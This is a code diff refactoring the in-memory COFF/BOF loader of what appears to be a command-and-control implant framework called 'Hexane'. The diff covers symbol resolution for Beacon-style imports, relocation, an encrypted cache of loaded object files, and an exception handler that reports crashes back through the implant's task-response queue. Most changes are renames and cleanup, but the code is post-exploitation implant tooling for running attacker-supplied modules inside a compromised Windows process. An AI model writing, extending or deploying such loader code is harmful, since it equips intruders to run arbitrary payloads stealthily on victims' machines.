@@ -11,9 +11,8 @@ using namespace Memory::Methods;
 
 namespace Objects {
 
-    PVOID __attribute__((used, section(".data"))) wrapper_return = nullptr;
-    // TODO: add common BOF/internal implant functions
-    HASH_MAP __attribute__((used, section(".rdata"))) internal_map[] = {
+    PVOID DATA_SX wrapperRet = nullptr;
+    HASH_MAP RDATA_SX internalMap[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -23,7 +22,7 @@ namespace Objects {
         { .name = 0, .address = nullptr },
     };
 
-    HASH_MAP __attribute__((used, section(".rdata"))) bof_map[] = {
+    HASH_MAP RDATA_SX bofMap[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -34,46 +33,43 @@ namespace Objects {
     };
 
     LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {
+        PACKET *packet = CreateTaskResponse(TypeError);
+        exception->ContextRecord->IP_REG = (UINT_PTR) wrapperRet;
 
-        _stream *stream = CreateTaskResponse(TypeError);
-        exception->ContextRecord->IP_REG = U_PTR(wrapper_return);
+        PackUint32(packet, ERROR_UNHANDLED_EXCEPTION);
+        PackUint32(packet, exception->ExceptionRecord->ExceptionCode);
+        PackPointer(packet, (LPVOID)((UINT_PTR)exception->ExceptionRecord->ExceptionAddress));
 
-        PackUint32(stream, ERROR_UNHANDLED_EXCEPTION);
-        PackUint32(stream, exception->ExceptionRecord->ExceptionCode);
-        PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));
-
-        MessageQueue(stream);
+        MessageQueue(packet);
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
-    VOID WrapperFunction(VOID *address, VOID *args, SIZE_T size) {
-
+    VOID WrapperFunction(LPVOID address, LPVOID args, SIZE_T size) {
         auto function = (OBJ_ENTRY) address;
 
-        wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
+        wrapperRet = __builtin_extract_return_addr(__builtin_return_address(0));
         function((CHAR*)args, size);
     }
 
-    BOOL ProcessSymbol(CHAR* sym_string, VOID **pointer) {
-
+    BOOL ProcessSymbol(CHAR* symString, VOID **pointer) {
         CHAR *function  = nullptr;
 
         // __imp_Beacon
         *pointer = nullptr;
-        if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
+        if (HashStringA(symString, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
 
-            function = sym_string + COFF_PREP_BEACON_SIZE;
-            return MapScan(bof_map, HashStringA(function, MbsLength(function)), pointer);
+            function = symString + COFF_PREP_BEACON_SIZE;
+            return MapScan(bofMap, HashStringA(function, MbsLength(function)), pointer);
         }
         // __imp_
-        if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
-            BOOL import = StringChar(sym_string, '$', MbsLength(sym_string));
+        if (HashStringA(symString, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
+            BOOL import = StringChar(symString, '$', MbsLength(symString));
 
             if (import) {
                 CHAR buffer[MAX_PATH] = { };
 
                 auto count = 0;
-                auto split = NewSplit(sym_string + COFF_PREP_SYMBOL_SIZE, "$", &count);
+                auto split = NewSplit(symString + COFF_PREP_SYMBOL_SIZE, "$", &count);
 #ifdef _M_IX86
                 Trim(split[1], '@');
 #endif
@@ -86,13 +82,13 @@ namespace Objects {
                 return *pointer ? true : false;
             }
 
-            function = sym_string + COFF_PREP_SYMBOL_SIZE;
+            function = symString + COFF_PREP_SYMBOL_SIZE;
             Trim(function, '@');
 
-            return MapScan(internal_map, HashStringA(function, MbsLength(function)), pointer);
+            return MapScan(internalMap, HashStringA(function, MbsLength(function)), pointer);
         }
         // .refptr.__instance
-        if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {
+        if (HashStringA(symString, MbsLength(symString)) == COFF_INSTANCE) {
 
             *pointer = (_hexane*) C_DREF(GLOBAL_OFFSET);
             return *pointer ? true : false;
@@ -102,8 +98,6 @@ namespace Objects {
     }
 
     BOOL ExecuteFunction(EXECUTABLE *image, const CHAR *entry, VOID *args, CONST SIZE_T size) {
-        HEXANE;
-
         VOID *veh_handle = nullptr;
         VOID *entrypoint = nullptr;
         CHAR *sym_name = nullptr;
@@ -190,7 +184,6 @@ namespace Objects {
     }
 
     BOOL BaseRelocation(_executable *image) {
-
         CHAR sym_name[9] = { };
         CHAR *name_ptr = nullptr;
 
@@ -280,7 +273,6 @@ namespace Objects {
     }
 
     SIZE_T FindFunctionMapSize(EXECUTABLE *image) {
-
         char sym_name[9] = { };
         int counter = 0;
 
@@ -311,8 +303,6 @@ namespace Objects {
     }
 
     VOID AddCOFF(_coff_params *bof) {
-        HEXANE;
-
         _coff_params *head = ctx->bof_cache;
 
         if (ENCRYPTED) {
@@ -339,8 +329,6 @@ namespace Objects {
     }
 
     COFF_PARAMS* FindCOFF(CONST UINT32 bof_id) {
-        HEXANE;
-
         auto head = ctx->bof_cache;
         // NOTE: coff_id will be a known name hash
 
@@ -365,8 +353,6 @@ namespace Objects {
     }
 
     VOID RemoveCOFF(const uint32 bof_id) {
-        HEXANE;
-
         _coff_params *prev = { };
 
         if (!bof_id) {
@@ -399,8 +385,6 @@ namespace Objects {
     }
 
     VOID Cleanup(_executable *image) {
-        HEXANE;
-
         if (!image || !image->base) {
             return;
         }
@@ -431,7 +415,6 @@ namespace Objects {
     }
 
     VOID COFFLoader(CHAR *entrypoint, VOID *data, VOID *args, SIZE_T args_size) {
-        HEXANE;
         // NOTE: sec_map seems to be the only thing that persists
 
 		EXECUTABLE *image = nullptr;
@@ -490,7 +473,6 @@ namespace Objects {
     }
 
     VOID COFFThread(_coff_params *coff) {
-
         if (!coff->entrypoint || !coff->data) {
             return;
         }
